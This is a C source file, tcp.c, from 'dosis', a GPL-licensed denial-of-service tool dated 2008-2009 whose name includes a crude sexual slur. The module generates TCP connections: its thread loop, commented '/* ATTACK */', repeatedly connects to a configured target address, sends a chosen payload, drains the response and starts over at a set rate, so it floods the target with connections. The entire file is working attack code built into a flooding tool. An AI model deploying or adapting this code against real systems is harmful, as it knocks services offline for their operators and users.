/*****************************************************************************
 * tcp.c
 *
 * TCP connection generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

#define DEFAULT_CWAIT           3000000
#define DEFAULT_RWAIT           10000000

typedef struct _tag_TCP_CFG {
  /* options */
  INET_ADDR          dhost;

  /* parameters */
  double             hitratio;
  char              *payload;
  unsigned           payload_size;

  /* other things */
  pthreadex_timer_t  timer;
  struct timeval     sockwait_cwait;
  struct timeval     sockwait_rwait;
  struct sockaddr    dsockaddr;
} TCP_CFG;

#define BUFSIZE 4096
static char nullbuff[BUFSIZE];

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

static void tcp__thread(THREAD_WORK *tw)
{
  fd_set socks;
  int sopts, r;
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  struct timeval sockwait;
  int sock;

  TDBG("Started sender thread");

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tt->hitratio > 0)
      if(pthreadex_timer_wait(&(tt->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /*** CONNECTION **********************************************************/
    TDBG("  Connecting...");

    /* Set timeout for select */
    memcpy(&sockwait, &tt->sockwait_cwait, sizeof(struct timeval));
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
      TERR("socket() failed (%s)", strerror(errno));
      continue;
    }

    /* Execute connection, but before set non block */
    sopts = fcntl(sock, F_GETFL);
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);

    if(connect(sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0
    && errno != EINPROGRESS)
    {
      TERR("connect() 1 failed:%s", strerror(errno));
      close(sock);
      continue;
    } else
      TDBG2("connect() sent!");

    /* connection is completed or in progress... */
    fcntl(sock, F_SETFL, sopts);
    FD_ZERO(&socks);
    FD_SET(sock,&socks);
    if((r = select(sock + 1, NULL, &socks, NULL, &sockwait)) < 1)
    {
      TDBG("connection timed out.");
      close(sock);
      continue;
    }

    /* second connect() to check connection */
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);
    if(connect(sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0)
    {
      /* XXX: Se puede llegar aqui porque aún no ha conectado :) */
      TERR("connect() 2 failed: %s", strerror(errno));
      close(sock);
      continue;
    }
    fcntl(sock, F_SETFL, sopts);
 
    /* Enviamos la peticion */
    r = send(sock, (void *) tt->payload, tt->payload_size, 0);
    if(r < tt->payload_size)
    {
      TERR("Send error.");
      continue;
    }

    /* Restablecemos los timeouts */
    memcpy(&sockwait, &tt->sockwait_rwait, sizeof(struct timeval));
    r = select(sock+1, &socks, NULL, NULL, &sockwait);
    if(!FD_ISSET(sock, &socks))
    {
      TERR("select() error %d: %s", r, strerror(errno));
      continue;
    }
    fcntl(sock,F_SETFL,sopts);

    /*** READ DATA ***********************************************************/
    TDBG("  Reading data...");
    /* Redireccionamos a /dev/null :) */
    while((r = read(sock, nullbuff, sizeof(nullbuff))) > 0)
      ;

    /* Hemos terminado */
    TDBG("  Closing connection.");
    if(close(sock) != 0)
      TERR("error on close(): %s", strerror(errno));
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcp__configure(THREAD_WORK *tw, SNODE *command)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* first initialization (specialized work thread data) */
  if(tt == NULL)
  {
    if((tt = calloc(1, sizeof(TCP_CFG))) == NULL)
      TFAT("No memory for TCP_CFG.");
    tw->data = (void *) tt;

    tt->sockwait_cwait.tv_sec  = DEFAULT_CWAIT / 1000000;
    tt->sockwait_cwait.tv_usec = DEFAULT_CWAIT % 1000000;
    tt->sockwait_rwait.tv_sec  = DEFAULT_RWAIT / 1000000;
    tt->sockwait_rwait.tv_usec = DEFAULT_RWAIT % 1000000;

    /* init timer */
    pthreadex_timer_init(&(tt->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC_LIGHT)
    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tt->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  if(tt->hitratio < 0)
    TFAT("%d: Bad hit ratio '%f'.", cn->line, tt->hitratio);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tt->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tt->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tt->payload, &tt->payload_size);
        break;

      case TYPE_OPT_CWAIT:
        {
          int t;
          t = tea_get_int(cn->option.cwait);
          if(t < 0)
            TFAT("%d: Bad connection wait (CWAIT) '%d'.", cn->line, t);
          tt->sockwait_cwait.tv_sec  = t / 1000000;
          tt->sockwait_cwait.tv_usec = t % 1000000;
        }
        break;

      case TYPE_OPT_RWAIT:
        {
          int t;
          t = tea_get_int(cn->option.rwait);
          if(t < 0)
            TFAT("%d: Bad read wait (RWAIT) '%d'.", cn->line, t);
          tt->sockwait_rwait.tv_sec  = t / 1000000;
          tt->sockwait_rwait.tv_usec = t % 1000000;
        }
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* check dst address and configure socket */
  if(tt->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  ip_addr_to_socket(&tt->dhost, &tt->dsockaddr);

  /* calculate timeout */

  /* configure timer */
  if(tt->hitratio > 0)
    pthreadex_timer_set_frequency(&(tt->timer), tt->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.ratio = %d", tt->hitratio);
    ip_addr_snprintf(&tt->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
  }

  return 0;
}

static void tcp__cleanup(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;

  /* collect libnet data */
  pthreadex_timer_destroy(&tt->timer);

  if(tt->payload)
  {
    free(tt->payload);
    tt->payload = NULL;
  }
  free(tt);
  tw->data = NULL;

  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCP = {
  .name         = "TCP",
  .configure    = tcp__configure,
  .cleanup      = tcp__cleanup,
  .thread       = tcp__thread,
};

